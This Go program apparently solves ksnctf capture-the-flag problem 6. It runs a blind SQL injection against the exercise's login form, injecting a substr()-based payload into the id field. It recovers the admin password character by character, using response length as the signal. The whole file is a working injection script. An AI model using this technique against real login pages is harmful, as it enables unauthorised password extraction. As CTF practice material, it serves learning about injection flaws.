package main

import (
	"net/url"
	"net/http"
	"strconv"
)

/**
以下のCTFコード
http://ksnctf.sweetduet.info/problem/6
 */

func httpReq(id string, pw string) (* http.Response) {
	targetUrl := "http://ctfq.sweetduet.info:10080/~q6/"
	parameters := url.Values{}
	parameters.Set("id", id)
	parameters.Add("pass", pw)
	res, err := http.PostForm(targetUrl, parameters)
	if err != nil {

	}
	return res
}

func analysisPassword(passLength int) (string) {
	// [a-zA-Z0-9]* のみ対応
	startCode := []rune("0")[0]
	endCode := []rune("z")[0]
	flag := ""
	for i := 0; passLength > i; i++  {
		for j := startCode; endCode > j; j++ {
			id := "admin' AND substr((SELECT pass FROM user WHERE id='admin'), " + strconv.Itoa(i + 1) + ", 1) = " + "'" + string(j) + "'" + " ; --"
			pw := "''"
			res := httpReq(id, pw)
			// ResponseのContentLengthで成功したか判断
			if res.ContentLength > int64(2000) {
				flag = flag + string(j)
				println("flag is : " + flag)
				break
			}
		}
	}
	return flag
}

func main() {
	println("start")
	passwordlength := 21
	analysisPassword(passwordlength)
}
